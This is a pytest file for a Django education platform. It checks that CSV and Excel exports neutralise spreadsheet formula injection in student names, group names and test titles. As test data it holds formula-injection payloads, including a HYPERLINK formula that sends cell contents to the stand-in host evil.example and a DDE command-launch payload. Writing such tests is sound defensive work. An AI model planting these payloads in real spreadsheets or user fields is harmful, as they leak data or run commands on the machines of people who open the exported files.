"""Exports must not turn user-controlled text into spreadsheet formulas."""

from __future__ import annotations

import csv
import io
from decimal import Decimal

import openpyxl
import pytest
from django.contrib.auth import get_user_model
from django.utils import timezone
from rest_framework.test import APIClient

from apps.accounts.models import Profile
from apps.core.spreadsheet import safe_cell, safe_row
from apps.courses.models import Course, StudentGroup
from apps.organizations.models import CenterBranch, LearningCenter
from apps.results.models import Result
from apps.tests.models import Test, TestAttempt

User = get_user_model()
EVIL = '=HYPERLINK("http://evil.example/?x="&A1,"click")'


@pytest.mark.parametrize("value", ["=1+1", "+1", "-1", "@SUM(A1)", "\t=1", "\r=1", "\n=1", EVIL])
def test_formula_triggers_are_neutralised(value):
    assert safe_cell(value) == "'" + value


@pytest.mark.parametrize("value", ["Ali Valiyev", "", "A=B", "5", 5, Decimal("-1.5"), None, 3.2, True])
def test_ordinary_values_are_untouched(value):
    assert safe_cell(value) == value


def test_safe_row_maps_every_cell():
    assert safe_row(["=x", 1, "ok"]) == ["'=x", 1, "ok"]


def _user(email, role, **extra):
    user = User.objects.create_user(email=email, password="x-Pass-123!", role=role, **extra)
    Profile.objects.get_or_create(user=user)
    return user


def _client(user):
    client = APIClient()
    client.force_authenticate(user)
    return client


@pytest.mark.django_db
def test_enterprise_csv_neutralises_student_name_and_test_title():
    owner = _user("csv-owner@example.test", "center_admin")
    center = LearningCenter.objects.create(name=EVIL, owner=owner)
    branch = CenterBranch.objects.create(name="B", center=center, director=owner)
    teacher = _user("csv-teacher@example.test", "teacher")
    student = _user("csv-student@example.test", "student", learning_center=center, branch=branch,
                    first_name=EVIL, last_name="=cmd|' /C calc'!A0")
    course = Course.objects.create(teacher=teacher, title="C", slug="csv-c")
    test = Test.objects.create(title="@SUM(1+1)*cmd", course=course, subject="uzbek")
    attempt = TestAttempt.objects.create(test=test, student=student, status=TestAttempt.Status.COMPLETED,
                                         completed_at=timezone.now())
    Result.objects.create(attempt=attempt, student=student, test=test, course=course, total_questions=1,
                          correct_answers=1, wrong_answers=0, score=Decimal("1"), max_score=Decimal("1"),
                          percentage=Decimal("100"), is_passed=True, time_taken_seconds=5)

    response = _client(owner).get("/api/v1/enterprise/report/download/")
    assert response["Content-Type"].startswith("text/csv"), response["Content-Type"]
    assert response.status_code == 200, response.content[:200]
    rows = list(csv.reader(io.StringIO(response.content.decode("utf-8-sig"))))
    cells = [cell for row in rows for cell in row]
    assert cells, "the export is empty"
    assert not [c for c in cells if c.startswith(("=", "+", "-", "@", "\t", "\r"))], cells
    assert any(c.startswith("'=HYPERLINK") for c in cells)  # the text is preserved, just inert
    assert any(c.startswith("'@SUM") for c in cells)


@pytest.mark.django_db
def test_group_excel_contains_no_formula_cells():
    teacher = _user("xl-teacher@example.test", "teacher")
    group = StudentGroup.objects.create(name=EVIL, teacher=teacher)
    student = _user("xl-student@example.test", "student", first_name="=1+1", last_name="@evil")
    group.students.add(student)
    response = _client(teacher).get(f"/api/v1/school/groups/{group.id}/export/excel/")
    assert response.status_code == 200, response.content[:200]
    assert response["Content-Type"].startswith("application/vnd.openxmlformats"), response["Content-Type"]
    workbook = openpyxl.load_workbook(io.BytesIO(response.content))
    offenders = [
        (ws.title, cell.coordinate, cell.value)
        for ws in workbook.worksheets for row in ws.iter_rows() for cell in row
        if cell.data_type == "f" or (isinstance(cell.value, str) and cell.value.startswith(("=", "+", "-", "@")))
    ]
    assert offenders == [], offenders


@pytest.mark.django_db
def test_panel_attendance_excel_contains_no_formula_cells():
    admin = _user("xl-admin@example.test", "admin")
    admin.is_superuser = True
    admin.save(update_fields=["is_superuser"])
    teacher = _user("xl-teacher2@example.test", "teacher", first_name="=cmd", last_name="x")
    StudentGroup.objects.create(name="=1+1", teacher=teacher)
    response = _client(admin).get("/api/v1/panel/attendance/export/")
    assert response.status_code == 200, response.content[:200]
    assert "spreadsheetml" in response["Content-Type"], response["Content-Type"]
    workbook = openpyxl.load_workbook(io.BytesIO(response.content))
    offenders = [
        (cell.coordinate, cell.value)
        for ws in workbook.worksheets for row in ws.iter_rows() for cell in row
        if cell.data_type == "f" or (isinstance(cell.value, str) and cell.value.startswith(("=", "+", "-", "@")))
    ]
    assert offenders == [], offenders
